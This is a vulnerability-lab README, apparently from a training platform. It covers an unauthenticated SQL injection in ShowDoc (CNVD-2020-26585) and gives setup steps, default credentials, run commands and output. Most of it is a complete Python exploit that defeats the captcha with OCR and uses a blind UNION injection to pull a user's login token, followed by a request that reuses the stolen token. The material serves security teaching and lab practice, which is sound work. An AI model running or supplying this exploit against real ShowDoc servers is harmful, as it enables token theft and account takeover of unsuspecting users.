# ShowDoc SQL Injection Vulnerability (CNVD-2020-26585)

> [中文文档](README.md)

| Attribute | Details |
|-----------|---------|
| **CVE ID** | CNVD-2020-26585 |
| **Affected Versions** | ShowDoc <= 3.2.5 |
| **Vulnerability Type** | SQL Injection |
| **Severity** | 🔴 High |
| **Default Port** | 8080 |

## Vulnerability Overview

`ShowDoc` is an open-source online documentation sharing tool. `ShowDoc <= 3.2.5` contains an unauthorized `SQL` injection vulnerability that allows attackers to steal user passwords and `Token` stored in the `SQLite` database.

## Vulnerability Reproduction

After the target machine is started, access `http://your-ip:8080` to view the `ShowDoc` homepage. After initialization, log in with username `showdoc` and password `123456`:

![ShowDoc Homepage](https://static.nextcyber.cn/attachments/images/course/task/7e4e549673f54135b546c4703ea78128.png)

The target is a `ShowDoc 2.8.2` server. Once a user logs into `ShowDoc`, their `token` is stored in the `SQLite` database. Compared to hashed user passwords, the user `token` is a better target for attackers.

## Exploitation

Before exploiting, install the `captcha recognition library`:

```
pip install onnxruntime ddddocr requests
```

Then run the provided `POC` to obtain the `token`:

```
python3 poc.py -u http://localhost:8080
```

Execution result:

```
┌──(root㉿nextcyber)-[~]
└─# python3 poc.py -u http://192.168.2.73:8080
欢迎使用ddddocr，本项目专注带动行业内卷，个人博客:wenanzhe.com
训练数据支持来源于:http://146.56.204.113:19199/preview
爬虫框架feapder可快速一键接入，快速开启爬虫之旅：https://github.com/Boris-code/feapder
谷歌reCaptcha验证码 / hCaptcha验证码 / funCaptcha验证码商业级识别接口：https://yescaptcha.com/i/NSwk7i
Current result: f
Current result: fd
...
Current result: fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4b5dde6df7b
```

After obtaining the `token`, use the following request to get user information:

```
GET /server/index.php?s=/api/user/info HTTP/1.1
Host: 192.168.2.73:8080
Cookie: cookie_token=fdd0f37cb4a6ff22ce39ebe6249c7696c009758a31d941587e32c4b5dde6df7b
```

## POC

```python
import argparse
import ddddocr
import requests
import onnxruntime
from urllib.parse import urljoin

onnxruntime.set_default_logger_severity(3)
table = '0123456789abcdef'
proxies = {'http': 'http://127.0.0.1:8085'}
ocr = ddddocr.DdddOcr()
ocr.set_ranges(table)

class RetryException(Exception):
    pass

def retry_when_failed(func):
    def retry_func(*args, **kwargs):
        while True:
            try:
                return func(*args, **kwargs)
            except RetryException:
                continue
            except Exception as e:
                raise e
    return retry_func

def generate_captcha(base: str):
    data = requests.get(f"{base}?s=/api/common/createCaptcha").json()
    captcha_id = data['data']['captcha_id']
    response = requests.get(f'{base}?s=/api/common/showCaptcha&captcha_id={captcha_id}')
    data = response.content
    result = ocr.classification(data)
    return captcha_id, result

@retry_when_failed
def exploit_one(base: str, current: str, ch: str) -> str:
    captcha_id, captcha_text = generate_captcha(base)
    data = requests.get(base, params={
        's': '/api/item/pwd',
        'page_id': '0',
        'password': '1',
        'captcha_id': captcha_id,
        'captcha': captcha_text,
        'item_id': f"aa') UNION SELECT 1,1,1,1,1,(SELECT 1 FROM user_token WHERE uid = 1 AND token LIKE '{current}{ch}%' LIMIT 1),1,1,1,1,1,1 FROM user_token; -- "
    }).json()
    if data['error_code'] == 0:
        return ch
    elif data['error_code'] == 10010:
        return ''
    elif data['error_code'] == 10206:
        raise RetryException()
    else:
        print(f'error: {data!r}')
        raise Exception('unknown exception')

def main():
    parser = argparse.ArgumentParser(description='Showdoc 3.2.5 SQL injection')
    parser.add_argument('-u', '--url', type=str, required=True)
    args = parser.parse_args()
    target = urljoin(args.url, '/server/index.php')
    res = ''
    for i in range(64):
        r = ''
        for ch in list(table):
            r = exploit_one(target, res, ch)
            if r:
                res += ch
                break
        print(f'Current result: {res}')
        if not r:
            break

if __name__ == '__main__':
    main()
```

---

## Practice Lab

Practice this vulnerability online at [NextCyber Lab](https://app.nextcyber.cn/courses/148).

---

> ⚠️ **Disclaimer**: All content in this directory is for learning and research purposes only. Do not use it for illegal activities.
